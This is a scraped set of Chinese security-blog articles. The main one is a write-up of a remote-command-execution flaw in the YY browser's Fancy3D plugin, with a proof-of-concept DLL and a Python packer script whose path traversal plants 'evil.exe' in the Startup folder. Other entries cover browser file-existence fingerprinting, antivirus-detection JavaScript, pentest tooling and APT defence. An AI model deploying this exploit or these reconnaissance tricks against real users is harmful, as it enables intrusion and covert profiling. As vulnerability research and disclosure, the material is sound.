正则匹配执行后的内容。具体的一些等git上贴出来再讨论吧，不过细分规则方面我并不拿手（一般是看看某z起头大牛某M起头大牛等偶像们开源出来的程序然后。。偷师，这里再次感谢&gt; &lt;）这个是最开始调试和编写雏形。当然，经常发现程序写着改着就有很多地方和最初设想的非常不一样。暂时就是这些，更多记录留待后续，有不对的地方或者更好的方法望大家多多指教~","2016-10-16 16:55:56","Web安全","一种DOM Based XSS自动检测雏形","http://nsoad.com/Article/web/20161016/578.html"
"5ccbfa6c4f2f0a0a7a69c06a","本文属于浏览器安全系列第三篇,目录如下2345浏览器本地文件读取及远程命令执行","Kong","本文属于浏览器安全系列第四篇,目录如下2345浏览器本地文件读取及远程命令执行百度浏览器远程命令执行搜狗浏览器从UXSS到远程命令执行Fancy3D引擎（YY浏览器）远程命令执行这是浏览器安全系列的最后一篇文章（就目前情况而言）了，静待乌云归来。免责声明本博客提供的部分文章思路可能带有攻击性，仅供安全研究与教学之用，风险自负!前言在研究YY浏览器的默认游戏助手插件时，在代码里面找到一个游戏的名字：jzwl，于是在YY的游戏中心搜索了一下，找到了下面这个页面：http://udblogin.duowan.com/login.do?online&amp;report_ver=new&amp;showtools=0&amp;webyygame&amp;pro=webyygame&amp;rso=FROM_SCTG&amp;rso_desc=%E5%B8%82%E5%9C%BA%E6%8E%A8%E5%B9%BF&amp;ref=gw/entergame&amp;ref_desc=%E5%AE%98%E7%BD%91%2f%E8%BF%9B%E5%85%A5%E6%B8%B8%E6%88%8F&amp;game=JZWL&amp;server=s6  点开这个页面的时候，我电脑上的腾讯安全管家弹出了下载文件的提示，仔细一看，我擦，自动下载了这么多文件下来！于是我觉得可以研究研究这个东西。 发现页面中有这样的一段代码：&lt;div class=""flash""&gt;    &lt;object id=""fancy3d"" type=""application/fancy-npruntime-fancy3d-plugin"" width=""100%"" height=""198""&gt;    &lt;param name=""game"" value=""jzwl""&gt;    &lt;param name=""nprver"" value=""0.0.2.17""&gt;    &lt;param name=""ocxver"" value=""0.0.2.17""&gt;         &lt;param name=""liburl"" value=""http://loader.52xiyou.zsgl.ate.cn/jzwl/loader/loaderUpdater.71f24efc47252dee7ca07eb571bd6f50.dll""&gt;         &lt;param name=""libmd5"" value=""71f24efc47252dee7ca07eb571bd6f50""&gt;         &lt;param name=""unsafelib"" value=""allow""&gt;         &lt;param name=""param1"" value=""cmdline=uid:1576442523|skey:6|platform:duowan|sign:7115344fa13ccca8950cfea0484437ce|type:web""&gt;    &lt;param name=""param2"" value=""client_root_url=http://res.jzwl.52xiyou.com/client/""&gt;     &lt;param name=""param3"" value=""ip_port=[121.46.21.176,121.46.21.176,121.46.21.176,121.46.21.176]|[8092]""&gt;        &lt;param name=""param5"" value=""loader_root_url=http://res.jzwl.52xiyou.com/loader/""&gt;         &lt;param name=""param6"" value=""loader_ver_name=loader.ver""&gt;         &lt;param name=""param7"" value=""loader_catalog_name=loader_catalog.txt""&gt;     &lt;param name=""param8"" value=""loader_name=loaderjz.dll""&gt;  &lt;/object&gt;&lt;/div&gt;  我擦！这个好像在哪里见过的：http://wooyun.org/bugs/wooyun-2016-0172781 我们开始分析吧！0x00 这个插件是哪里来的？YY浏览器启动的时候会检查注册表中是否已经安装有Fancy3D游戏引擎这个NPAPI插件，具体路径如下。如果不存在，则会自动静悄悄地帮用户安装上。HKEY_CURRENT_USER\Software\MozillaPlugins\@fancyguo.com/FancyGame,version=1.0.0.1  0x01 插件功能分析libcurl和libcmd5这两个参数在 http://wooyun.org/bugs/wooyun-2016-0172781 已经分析过，这里更简单，连域名白名单限制都没有做，直接修改成为自己的域名都会请求，一开始我以为是可以直接搞定的。但实验过后发现，自己写的dll按照规则放进去之后并没有加载到进程中。进一步查看信息，发现360浏览器那个洞里出现的游戏提供方好像是同一家公司，看样子是做了数字签名，没什么好方法，先放一边。里面还有几个参数，看上去也是会下载文件，把改成自己本地的地址（注：我在Hosts文件里做了127.0.0.1 a.com映射）看看它都会请求下载哪些东西。测试过后，发现过程如下：下载loader_root_url + loader_ver_name，即这个文件：http://res.jzwl.52xiyou.com/loader/loader.ver ，其内容为2016-06-02下载loader_root_url + 2016-06-02/loader_catalog.txt，即：http://res.jzwl.52xiyou.com/loader/2016-06-02/loader_catalog.txt ， 其内容如下：    curl.exe.lzma||3b0c063789066f74667efc13db00e9cc||247772||f4edf7cab0d6a404b77eb816c996831c||506048    jztr.exe.lzma||c5dbe14ad37375371cb79261b848bcc8||69086||339068e9b3286cb30e100c398ea632f1||154816    flash.ocx.lzma||b2a9e2cdb422b3a71558ad9b6acc4ec8||1701337||8afc17155ed5ab60b7c52d7f553d579c||3866528    loading.swf.lzma||a77c04de83da48dcbb6b15c9028829a7||961202||5f52ea04bc871804c0c059a82053894c||950321    loaderjz.dll.lzma||4a51f304098ccebcecdf238ff3736d60||350535||2f22bb87e00681d858e3bd6013843231||804496下载上面的文件，并执行加载游戏的一些操作。通过procexp.exe查看相应YY浏览器的NPAPI的进程，发现其动态加载的dll中，果然有loaderjz.dll这个文件。目录结构如下：    │───poc.html    │    └───loader        │   loader.ver        └───2016-06-02                curl.exe.lzma                flash.ocx.lzma                jztr.exe.lzma                loaderjz.dll.lzma                loader_catalog.txt                loading.swf.lzma0x02 分析文件格式$ binwalk curl.exe.lzmaDECIMAL       HEXADECIMAL     DESCRIPTION  --------------------------------------------------------------------------------42            0x2A            LZMA compressed data, properties: 0x5D, dictionary size: 16777216 bytes, uncompressed size: 506048 bytes  观察每个文件，发现它们都有一个不定长的头部信息，然后是LZMA:24算法压缩的数据包，Google之后猜测是使用这里的工具开发的：http://www.7-zip.org/sdk.html接下来分析一下头部信息都是些什么东西。注：这里用的是小端规则。 00 - 03 字节：29 00 00 00 = 0x29 = 41，正好是上面binwalk分析出来的头部长度。04 - 07 字节：B3 C7 03 00 = 0x03C7B3 = 247731，是loader_catalog.txt文件中 247772 - 41 得到的，而247772是curl.exe.lzma文件的大小。最终，通过binwalk -e解压开文件，发现就是加了头部信息之前的文件的大小 + 108 - 11 字节：C0 B8 07 00 = 0x07B8C0 = 506048，应该就是解压后文件的大小12 - 13 字节：09 00 = 9，刚好就是字符串curl.exe的长度，注意结尾的\014 - 15 字节：11 00，暂时没猜到16 - 31 字节：0000000000000000000000000000000032 - 40 字节：6375726C2E65786500 = curl.exe0x03 劫持loaderjz.dll.lzma这个文件实现远程命令执行首先，自己实现一个dll文件，在其DllMain入口函数的时候中启动一下计算器就好，代码如下：BOOL APIENTRY DllMain(HMODULE hModule,      DWORD  ul_reason_for_call,    LPVOID lpReserved){    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:        WinExec(""calc"", 0);        break;    case DLL_THREAD_ATTACH:    case DLL_THREAD_DETACH:    case DLL_PROCESS_DETACH:        break;    }    return TRUE;}编译成Release版本，改名，使用 http://www.7-zip.org/sdk.html 这里下载得到的lzma.exe压缩一下文件E:\lzma\bin&gt;lzma.exe e loaderjz.dll loaderjz.dll.lzma -d24LZMA 16.02 : Igor Pavlov : Public domain : 2016-05-21Input size:  12288 (0 MiB)  Output size: 5748 (0 MiB)  接着使用脚本gen.py（见测试代码）生成带有头部信息的文件：$ python gen.py loaderjz.dlloutput.lzma||3a94912118bc172065d643e1aa847b0d||5794||9bc1ee40c622a0d7a1f96a6c9119bbe6||12288  将生成的output.lzma覆盖loaderjz.dll.lzma，并将loader_catalog.txt中的值修改成上述命令的输出，使用YY浏览器访问测试页面。就可以执行任意程序了。0x04 任意路径写入漏洞导致RCE在测试的过程中，我还发现头部信息中的文件名可以使用..跳转到上一级目录中，也就是说我们可以利用这个点来将一个可执行文件写入到用户的启动目录中。在生成头部信息时，只需要使用文件名：..\\..\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\evil.exe，YY浏览器在下载这个生成的lzma文件之后就会自动将这个文件写入到启动目录中。测试代码gen.pyimport struct  import os  import sys  import hashlibinputFileName = sys.argv[1]  #fileName = ""..\\..\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\evil.exe""fileName = ""loaderjz.dll""  fileNameLength = len(fileName) + 1  lzmaFile = inputFileName + "".lzma""  outputFile = ""output.lzma""def md5(fname):      hash_md5 = hashlib.md5()    with open(fname, ""rb"") as f:        for chunk in iter(lambda: f.read(4096), b""""):            hash_md5.update(chunk)    return hash_md5.hexdigest()with open(outputFile, ""wb"") as f:      f.write(struct.pack('I', 32 + fileNameLength))    f.write(struct.pack('I', os.path.getsize(lzmaFile) + 1))    f.write(struct.pack('I', os.path.getsize(inputFileName)))    f.write(struct.pack('H', fileNameLength))    f.write(struct.pack('H', 0x11))    f.write('\x00' * 16)    f.write(fileName)    f.write('\x00' * 2)    with open(lzmaFile, ""rb"") as lzmaF:        f.write(lzmaF.read())print outputFile + ""||"" + md5(outputFile) + ""||"" + str(os.path.getsize(outputFile)) +\          ""||"" + md5(inputFileName) + ""||"" + str(os.path.getsize(inputFileName))","2016-10-18 17:44:22","Web安全","Fancy3D引擎（YY浏览器）远程命令执行","http://nsoad.com/Article/web/20161018/593.html"
"5ccbfa764f2f0a0a7a69c06b","本文属于浏览器安全系列第二篇,目录如下2345浏览器本地文件读取及远程命令执行","silence","微软修复了其它指纹识别漏洞. 我们之前提到它“未修复”, 对应 CVE-2016-3298。现在任何指纹识别的尝试都会返回成功的标志(onreadystatechange/onload fire anyway) 即使相关资源并不存在。实际上，这个补丁是确保内容来自于资源节，除了res://ieframe.dll没有被加载，反而地址栏设置成了默认的 about:blank 页面。修复信息泄漏漏洞仍然是一个持续的问题。事实上，到Windows更新推送修复漏洞数小时的时间内，[Manuel Caballero]（https://twitter.com/magicmac2000 ）发现了绕过方法。 更新于： 09/19/2016Manuel Caballero 已经绕过了 CVE-2016-3351 的补丁。可以去他的博客查看详情。正如我们在这篇博文的结尾所提到的“信息泄漏的漏洞似乎挥之不去，修复后很快又有新的浮出水面”。更新于: 09/14/2016经 Proofpoint 和 TrendMicro 的研究发现，微软官方也修复了另一个信息泄漏 bug(CVE-2016-3351) 被称为 ‘MIME type check’ ，影响 IE 和 Edge 浏览器。 我们在下面的博客中有加入相关内容。Note: IE/Edge 的 res 漏洞 尚未修复 (感谢 Manuel Caballero 的检测).正文内容：恶意软件的作者会利用一切工具和手段来保证他们的操作在不被人察觉的模式下进行。指纹识别使得他们拥有了额外的优势，从而在安全研究人员面前瞒天过海，销声匿迹地进行大规模活动。简要描述的话，指纹识别技术利用了浏览器的信息泄露漏洞，允许攻击者读取用户的文件系统查找特定的名称。有大量的指纹识别成功应用的例子；早在2016年3月时在我们的研究白皮书中就进行了报道，Operation Fingerprinting，但即便如此也只是冰山一角而已。最近，Proofpoint 的研究者揭露了一次大规模的恶意广告活动 ，该活动至少进行了一年甚至更久，这样恶意软件就有了很大的感染范围。它主要依靠指纹识别使其被细分真正的目标用户忽视，即真正运行OEM的计算机。图1： 在恶意广告活动中使用指纹，隐藏在GIF图片中当然，在日益增长复杂的线上攻击的层面上，这给防守方上了一课。同时，我们还能够轻松地从坏人的工具集中去除强大的武器，这可以迅速识别他们的活动，至少在他们想起其他技巧之前。也有像指纹识别这样的隐私相关应用能够用来分析用户，这种是基于探测存在于他们机器上的一系列程序实现的。我们可以想象，A公司的营销人员对访问他们网站的人是否使用B公司的产品感兴趣。图2：直接从浏览器检查是否安装了诺顿反病毒软件使用简单的一小行代码即可完成（目前尚未修复，请在附加内容阅读相关细节），虽然这会让很多人大开眼界。不太正直的行动者可能会对监视利益相关者感兴趣，检查他们是否运行特定的类似于 VPN和加密软件的工具。关于一些能造成漏洞的协议的历史滥用 IE 协议使得恶意软件制造者运行恶意代码或者获取受害者的敏感信息。我们在此回顾一些过去和现在的技术，包括现在尚未修复并且在漏洞利用工具包和恶意广告中有用到的技术。File:// protocol如果我们回到XP SP2之前系统版本的时代，本地计算机域（ LMZ，local machine zone ）允许你突破其他协议的限制运行二进制文件，即 file:// protocol图3：微软修复了在IE6及之前版本运行二进制文件的缺陷file://协议正如字面上所说，在运行本地计算机域上以全权限运行。你可以在页面中这么写：&lt;iframe src=""file://c:/downloads/malicious.html""&gt;&lt;/iframe&gt;  实例化 WScript.Shell 后，便可任意代码执行。XMLDOM loadXML (CVE-2013-7331)回到2013年，研究者发表了这样一篇文章： Microsoft XMLDOM in IE can divulge information of local drive/network in error messages – XXE。 这项技术被漏洞利用工具包和一些恶意广告广泛利用。XMLDOM 技术在指纹识别方面是最强大的技术之一，因为它允许任何类型的文件进行检查（不仅是二进制文件）。微软通过检测 XMLDOM 修复了这个漏洞，这里有相关的讨论。PoC： http://pastebin.com/raw/Femy8HtGOnload res:// CVE-2015-2413res:// 是个IE内部协议，运行于 Internet 域 （即使是本地文件），允许网页从本地文件（从资源节）加载资源。同时，IE 对很多这种 res: URLs 进行了“特殊”处理，允许它做的事情就像打开Internet 连接对话框这种行为。微软允许 res: URLs 被正常的HTTP 网页加载，因为 IE/Edge 需要它来完成浏览器的一些功能，比如默认的错误和信息页面。它加入了 Magnitude EK ，作为入口的预检测功能，但现在也已经修复了。res技术并不如 XMLDOM 一样好，因为它只能检测二进制文件，需要资源节部分。图4：通过onload触发的脚本创建图片来检测资源是否被加载正如在 Proofpoint 所描述的详情，事实上早在2014年二月 MIME 类型检查已经使用了很长一段时间。使用这个漏洞的目的是为了发现是否有文件关联到特定安全或者开放程序上（例如 Wireshark, Fiddler, Python 等），还有一些常规的软件（Skype, VLC 等）。通过这些判断，攻击者可以选择是否继续进行攻击。这便是筛选出安全研究员和真正目标群体的方法。这个bug在2016年9月13日被微软修复。我们在2014年的11月“偶然”发现了这项技术，这篇文章里有所介绍，启动了各种事件的连锁反应。我们在2015年中期再次遇到了它，它被成功的应用于大型恶意广告。这一次，恶意代码躲在了假的GIF图片里面。除了检查MIME类型，它也用到了XMLDOM漏洞。如果你有兴趣检查这个BUG，Manuel Caballero写了一小段代码。Iframe res:// variant (unpatched)更新于(10/11/2016): 微软已修复，对应 CVE-2016-3298.受影响的软件：操作系统：Windows 7, Windows 10 (均已修复).浏览器： Internet Explorer 10, 11. Microsoft Edge (38.14393.0.0) &amp; Microsoft EdgeHTML (14.14393).Note：比如 Microsoft Edge 浏览器，指纹识别技术仅对Windows 和 Program Files 文件夹起作用，因为AppContainer 不允许对系统的其它部分进行读取。图5：利用网页确定 %system32% 路径下 calc.exe 的存在当前在漏洞利用工具包中的使用：我们研究了 Neutrino EK 通过相同的 Flash 利用工具过滤安全研究员，用来入侵感染系统的方法（Neutrino EK: fingerprinting in a Flash），以及其预检查的技巧（https://blog.malwarebytes.com/cybercrime/exploits/2016/06/neutrino-ek-fingerprinting-in-a-flash/）。图6：用来检查本地文件的iframe使用在 Flash 利用代码中的 ActionScript ，Neutrino EK 能够检查可加载的资源并通过 JavaScript 和 DOM 来猜测那些文件是否存在。声明：鉴于微软目前正在制作补丁，我们没有共享我们的PoC。虽然这是真实的而且现实环境依然存在，我们写的 PoC 源自 Neutrino 基于 Flash 制作的指纹识别，更易被坏人所利用。如果你感兴趣，请私下联系我们。解决方案一个很好的解决方是让IE加载只被自身加载的资源文件，比如mshtml.dll，ieframe.dll等文件。其他的应该被阻止加载。换句话说，iexplorer.exe（或者其他使用 WebBrowser控件的其他二进制文件）应该只被允许加载 WebBrowser 引擎真正需要资源，其他一律禁止。res协议的唯一合法用途便是IE内部页面/对话框，也许以下旧的工具栏也需要。开发者工具（F12）也在使用它。图7：在Microsoft Edge浏览器中的 res:// 调用一些依赖于 res:// 的旧的工具栏可能会停止工作，但它们可以将那些特定的DLL列入白名单，或者采用更好的方法，即让开发者更新代码。总结信息泄漏的漏洞似乎挥之不去，修复后很快又有新的浮出水面。这可能是由于没有从根本上解决问题，也许是因为作出重大改变存在兼容性风险。而这些缺陷相比之下并不严重，假设存在远程代码执行漏洞的话，这就能帮助坏人为真正的受害者保留那些远程代码执行漏洞并且在安全社区中隐藏更久。","2016-10-14 01:12:52","Web安全","基于浏览器的指纹识别: 影响和缓解措施","http://nsoad.com/Article/web/20161014/549.html"
"5ccbfa764f2f0a0a7a69c06c","项目主页https://manifestsecurity.com/appie/简介Appie （Android Pentesting Portable Integrated Environment）是一款便携式的Android渗透测试工具包，可以运行在任何基","Kong","项目主页https://manifestsecurity.com/appie/简介Appie （Android Pentesting Portable Integrated Environment）是一款便携式的Android渗透测试工具包，可以运行在任何基于Windows的机器上作为Android渗透测试环境。非常轻便，集成了主流的Android应用安全评估、Android取证、Android恶意软件分析工具，可以用来替代传统的虚拟机渗透测试环境。特点Appie中集成的工具是运行在宿主机器上的而不是运行在虚拟机中的；Appie占用的空间少，只要1.5G左右，而传统的虚拟机需要至少10G；Appie非常便携，可以用U盘或者手机携带使用而不需要重新配置；界面酷炫。Appie包含了哪些工具	Android Debug Bridge	Apktool	AndroBugs Framework	AndroGuard	Androwarn	Atom	ByteCodeViewer	Burp Suite	Drozer	dex2jar	Eclipse IDE with Android Developer Tools	Introspy-Analyzer	Java Debugger	jadx	Jd-Gui	Pidcat	SQLite Database Browser	SQLmap	Volatility Framework它还集成了Java（JRE）和Python的运行环境还有一些Mozilla Firefox浏览器的安全插件几乎所有的UNIX命令包含一些用于测试的应用，如：Owasp GoatDroid Project Configured 和 InsecureBank-v2使用说明Apktool：可以直接输入apktool来使用ApktoolAndroBugs Framework：可以输入androbugs来使用AndroBugs框架AndroGuard：Androguard项目里有多个文件，需要到它们的网站去看各个文件的具体使用方法，比如需要使用androgui直接在终端输入androgui即可。Androwarn：在控制台输入androwarn来打开androwarn的目录，然后查看它的使用方法。Atom：在终端输入atom，它会打开Atom文本编辑器ByteCodeViewer：输入bytecodeviewer。Burp Suite：输入burpsuite来打开。Drozer：输入drozer console connect，然后drozer应用会在右侧加载。dex2jarEclipse IDE with Android Developer Tools：输入eclipse打开。Introspy-AnalyzerJava Debuggerjadx：输入jadxJd-Gui：输入jdgui即可打开JD-GUI界面。Pidcat：比如想看org.owasp.goatdroid.fourgoats的logcat记录，输入pidcat org.owasp.goatdroid.fourgoatsSQLite Database Browser：输入sqlitebrowser来打开。SQLmap：输入sqlmap。Volatility Framework：输入volatility。Wireshark：输入wireshark启动。常见问题参考：https://manifestsecurity.com/appie/#FAQ演示视频更多Android安全工具移动安全之Android安全检测工具大全基于Android平台的渗透测试工具兵器谱","2016-11-08 17:15:34","安全工具","Appie：便携式Android渗透测试工具包","http://nsoad.com/Security-tools/20161108/tools-723.html"
"5ccbfa764f2f0a0a7a69c06d","为了确保更安全，我给Windows 7系统安装了卡巴斯基互联网安全防病毒软件。一天我在某Web页面看到一段有趣的代码，在我看来它不该出现在页面上。","blackhold","我常使用的操作系统是 Windows7，为了确保更安全，我安装了卡巴斯基互联网安全防病毒软件。一天我在一个 Web 页面上看到了一段非常有趣的代码，在我看来它不该出现在页面上。为什么 Facebook 会使用卡巴斯基网站的 js 代码？我立刻意识到是我的反病毒软件做了 MITM，在网页上注入代码来跟踪页面的活动。在客户端计算机上存在任何的反病毒软件的话，包括 KIS，为什么不创建一个特殊的页面来监视 Javascript 的代码呢？创建服务器的第一个页面 iframe.html&lt;!DOCTYPE html&gt;&lt;html lang=""en""&gt;&lt;head/&gt;        &lt;img src=x /&gt;    &lt;script type=""text/javascript"" /&gt;&lt;/html&gt;随后创建第二个页面 index.html&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Remotely  AV detection&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;iframe style=""width:10px; height:10px; display:block; visibility:show"" id=""frmin"" src=""/iframe.html""&gt;&lt;/iframe&gt;&lt;button onclick=""myFunction()""&gt;Check  AV&lt;/button&gt;&lt;script&gt;function myFunction() {var frm = document.getElementById(""frmin"");ka = frm.contentDocument.getElementsByTagName('html')[0].outerHTML;if (ka.indexOf(""kasperskylab_antibanner"") !== -1){        alert(""AV name is Kaspersky"");}}&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;当我们打开 index.html 页面时，它将会加载 iframe.html 并注入 js 代码，在这个图片中我们可以看到更改的 iframe 页代码KIS 反病毒软件需要从 iframe.html 中读取代码并分析字符串，如果页面有 kasperskylab_antibanner 我们就可以说客户端计算机已经安装了卡巴斯基反病毒软件。我想看看这种方法对于其他反病毒软件的检出情况，是只能检出卡巴斯基还是其他的也可以。接下来对 Avira、Norton、DrWeb 反病毒软件进行检测，如果有人想继续研究，我很高兴听到研究的结果。Avira、Norton、DrWeb 和 Chrome 搭配进行检测，甚至还要安装插件来让反病毒软件可以注入特定数据到页面以完成对页面的检测。Dr.WebDrWeb Security Space 11.0Chrome 扩展的名字：Dr.Web Anti-Virus Link Checker Extension URL在 index.html 中注入下列代码：使用以下简单代码就可以检测出客户端是否安装了 DrWeb&lt;script&gt;if (document.getElementsByClassName('drweb_btn').length &gt; 0){        alert(""AV name is DrWeb"");}&lt;/script&gt;##Avira当你安装了 Avira antivirus Pro 时，直接就给你安装了两个扩展：Avira Browser Safety 和 Avira Save Search PlusAvira 会注入下列代码如下简单代码就可以检测出 Aviravar AV = document.getElementById(""abs-top-frame"")if (AV!==null){if (AV.outerHTML.indexOf('/html/top.html')&gt;=0 &amp; AV.outerHTML.indexOf('chrome-extension://')&gt;=0){    alert(""AV name is Avira"");}}Norton诺顿会像 Avira 一样安装两个插件会注入如下代码通过下面的代码就可以检测出 Nortonvar NAV = document.getElementById('coFrameDiv');if ( NAV !== null){    var nort = NAV.outerHTML;    if (nort.indexOf('coToolbarFrame')&gt;=0 &amp; nort.indexOf('/toolbar/placeholder.html')&gt;=0 &amp; nort.indexOf('chrome-extension://')&gt;=0 )    {        alert(""AV name is Norton"");    }}结论1. 这种方法并不能保证百分之百检出反病毒软件，因为用户可以禁用安装的 Chrome 扩展。2. 这篇文章的灵感主要来自于远程检测用户反病毒软件。3. 相关代码可以在 GitHub 上找到。","2016-11-23 14:11:22","系统安全","简单方法检测远端用户的反病毒软件","http://nsoad.com/Article/system/20161123/838.html"
"5ccbfa764f2f0a0a7a69c06e","Geoip可视化攻击图谱可以用于实时显示您正在遭受的网络攻击，它会跟踪系统日志文件，解析出日志里的源IP、目的IP、源端口和目的端口。","Kong","Geoip可视化攻击图谱可以用于实时显示您正在遭受的网络攻击，它会跟踪系统日志文件，解析出日志里的源IP、目的IP、源端口和目的端口。介绍该工具的可视化机制会根据常见端口进行细分，通过不同的协议类型进行颜色区别。Geoip可视化攻击图谱项目的诞生，需要特别感谢Sam Cappella。这位大牛在2015的Palmetto网络防御比赛中制作了一个可视化流量工具。笔者参考了他一部分代码，在构建展示服务器和web视觉界面时，也借用了部分函数。同时，笔者还得感谢Dylan Madisetti给了某些具体实现方面的建议。Github下载地址在这里。该项目对系统日志非常依赖，然而大家都知道，不同的应用会有不同的日志格式，所以你需要自行定制日志解析函数。但是，如果您的公司正在使用SIEM（记录安全信息和事件管理的）系统，你可能会省下大量编写正则表达式的时间。1.    将所有日志放进SIEM。2.    使用SIEM去格式化日志。3.    将处理后的日志发送给geoip可视化攻击图谱，让DataServer来解析它。安装运行下面的命令，可以安装所有的依赖项（Ubuntu 14.04 x64下测试成功）# sudo apt-get install python3-pip redis-server# sudo pip3 install tornado tornado-redis redis maxminddb设置1.    如果您打算把DataServer运行在其他机器上，可以把/etc/redis/redis.conf里面的默认配置，从bind 127.0.0.1更改为bind 0.0.0.0。2. /AttackMapServer/index.html里的WebSocket地址需要指向AttackMapServer的IP地址，这样浏览器才能正确识别。3.    下载MaxMind GeoLite2数据库，将DataServer.py里的db_path变量的值，更改为你存放数据库的地址。下载方式在这里：./db-dl.sh4.    将经纬度填入index.html里的hqLatLng变量。5. 需要的话，可以使用syslog-gen.sh模拟外部流量。6.    注意：这些代码只能在定制好解析函数后，才能在生产环境里正确运行。默认的解析函数只能解析./syslog-gen.sh产生的伪流量。","2016-11-28 11:35:21","安全工具","Geoip可视化攻击图谱：打造专属的炫酷风","http://nsoad.com/Security-tools/20161128/tools-853.html"
"5ccbfa764f2f0a0a7a69c06f","本文将为你介绍一下，关于预防网络攻击的新思维——为网络攻击设计多个假的攻击目标及路径，降低他们的攻击效率。","xiaohui","本文将为你介绍一下，关于预防网络攻击的新思维——为网络攻击设计多个假的攻击目标及路径，降低他们的攻击效率。交互式防护是一种安全系统特性，其意味着防御者会与攻击者及其使用的攻击工具进行交互攻防以及根据攻击者的行为作出相应的预防措施。比如，防御者会引入垃圾搜索结果以混淆网络攻击者使用的漏洞扫描程序就是一种交互式防护，除了这些被动防御之外，研究人员长期以来一直使用交互式防护的方法来主动获取关于网络攻击者的攻击信息，比如攻击目标等。但交互式防护和“攻击性”保护方法是两个完全不同的概念。前者意味着防御者与攻击者之间的攻防互动，以便在受保护的基础设施内检测出APT攻击，从而转移他们的注意力并将它们诱导到错误的攻击目标上。而“攻击性”保护除了被动防护意外还利用自己的漏洞来进行主动攻击（即所谓的“黑客攻击”），但这种回击的做法不仅违反了许多国家的法律而且还危及第三方，比如受网络攻击危害的用户计算机。那么在不违反法律并且可以在组织现有的IT安全架构中使用的交互式保护方法不仅可以发现基础设施内是否存在入侵者，而且可以创建对发生的威胁信息进行存档分析。其实研究人员早已使用这种它们交互式保护方法来分析网络威胁。不过这种方法还可以用于保护企业网络中有价值的数据免受有针对性的攻击。高级持续性威胁(APT)是当今公司企业面临的最危险的网络攻击之一，近几年来，APT攻击事件此起彼伏，从针对乌克兰国家电网的网络攻击事件，到孟加拉国央行被黑客攻击导致8100元美元被窃取，APT攻击以其无孔不入的触角延伸到了全世界各地，几乎所有的重要行业如政府、金融、电力、教育都受到了APT攻击的威胁。神秘的APT攻击从攻击开始到达成目的，有的甚至可能潜伏长达数年，对APT组织的未知导致人们在面临APT攻击时的茫然无措。缓解APT的风险似乎意味着要部署非常复杂的网络安全措施，这似乎超出了大多数普通企业组织的能力范围。事实并非如此。企业只要利用交互式防护，就能大大降低APT风险。APT攻击特点：不管有多复杂，所有APT攻击通常遵循相似的路径。侦察：攻击者通常会使用多种手段来获取情报，了解公司的网络实际上是什么样子，以便搞清楚实施了什么样的安全策略和应用程序，或者找出可以为他们提供入口点的远程访问功能。常见的手法包括如下：1.开源情报包括扫描对外开放的服务，以查找安全漏洞。2.人力资源情报针对关键员工，以获取访问信息。3.资产摸底识别企业组织在使用哪些版本的软件或资源，以便了解网络基础设施的概况。漏洞投放：一旦攻击者找到了攻击你网络的相应的入口点，就会投放一个恶意工具或应用程序，让他们得以渗入到你的网络。选择的攻击途径可能包括电子邮件附件、所谓的“水洞”攻击(攻击者危及他们知道受害者可能会访问的现有网站)，或者甚至是将漏洞投放到被感染的U盘上。探查和横向扩展：成功潜入到你的网络里面后，攻击者试图在你的网络里面横向移动，最终获取你那宝贵的业务数据。但这些数据通常在另一个计算机系统上，所以攻击者需要找到一条路径。这种横向移动正是APT的持久性发挥作用的地方。探查需要一段时间――在此期间，个人用户可以重启系统，更改安全签名，或者以其他方式让攻击者很难重新访问其机器。因此，攻击者理想情况下旨在将软件直接部署到一台台机器上，让他们得以随时可以回来，即便用户重启了机器或打上了补丁。基于上面的分析，我们可以知道之所以企业在采取防护措施后还屡遭攻击，就是以前的那些防御识别安全解决方案的架构还无法识别未知那些隐藏或针对企业基础设施来窃取有价值数据的威胁或犯罪行为。比如，攻击者已经预先研究了公司安全系统的特定特征并且识别出了那些将被安全解决方案忽视的有价值数据会在其他用户的合法操作中丢失的方式。由于APT攻击不同于其他类型的攻击，在目标选择和精确执行方面，APT攻击类似于手术似的攻击，而不是全面轰炸似的大规模攻击。这种攻击方式决定了他们很难被检测到并且长时间潜藏以窃取有价值的数据。为了防止APT攻击，企业的安全防御者不仅要对攻击者正在实施的攻击进行打击（比如通过当前的防护程序来分析安全状态，恶意代码等），还要使用企业网络上的特定行为特征来对隐藏的攻击进行检测以防止他们有可能的攻击行为。从理论上说，攻击者有无限的时间和足够的资金来展开扫描探测工作，总能找到防御薄弱点，最终达成入侵目的，但在完全物理访问其网络资源上，防御方仍然具有很大优势。他们可以使用它对自己的网络安全设置自己的特定规则，把有价值的数据隐藏起来以防止攻击者检测到。不过除了常规性的方法和技术来保护有价值的信息之外，防御方还需要构建类似于交互式防护这样的系统，以便获得关于攻击者的最新动向。安全系统中的交互性意味着对攻击者的攻击行为的反应。例如，可以将攻击者的攻击资源包列入到黑名单（例如其执行攻击的IP地址）或者将受损的工作站与其他网络资源隔离。目前对于企业的网络蜜罐的使用存在着很多不当的使用，虽然这一安全网络安全技术最近几年比较火。那先让我们了解一下什么是蜜罐防护技术。蜜罐的定义：顾名思义，在网络安全中，蜜罐里面装满了网络黑客期待的蜜糖。而这些蜜糖存在的意义就是诱骗黑客攻击蜜罐。比较官方的解释是：蜜罐是一台无人使用但却被严密监控的网络主机，它包含虚假的高价值资源和一些漏洞，以此吸引入侵者攻击主机。并且在被入侵的过程中，实时记录和审计攻击者的攻击流量、行为和数据。以此了解攻击者的方式、手段和目的，并且完成对攻击溯源、取证等进一步的工作。比较早的时候还没有蜜罐的定义，那时候有一间公司遭到来自内网的入侵攻击，而该公司却不能找出攻击的源头。此时，公司的一名员工伪造了一个有漏洞的系统服务，并且在此基础上添加了网络监控的功能。部署上线后该系统也遭到来自于内网的入侵攻击，网络监控也发挥了功能，捕获到攻击来源。其实，该系统就是我们所说的蜜罐系统，但是那时候还没有得到明确定义。随着时间推进，蜜罐开始进入公众视野，功能不断完善，添加上网络监控、主机监控等多方面支持。后来蜜罐也向多个方面发展，蜜网系统、工控蜜罐、Linux蜜罐等等。蜜罐的使用价值：蜜罐是网络战争提前获得消息的利器，那么网络战争中如果知道敌人的攻击手段，你会怎么做？断网？防火墙？IPS？主动出击，先发制人。在蜜罐系统上伪装了各种真实的业务资源，例如邮箱服务，ftp服务、网站服务等等，用来欺骗敌人入侵蜜罐系统，并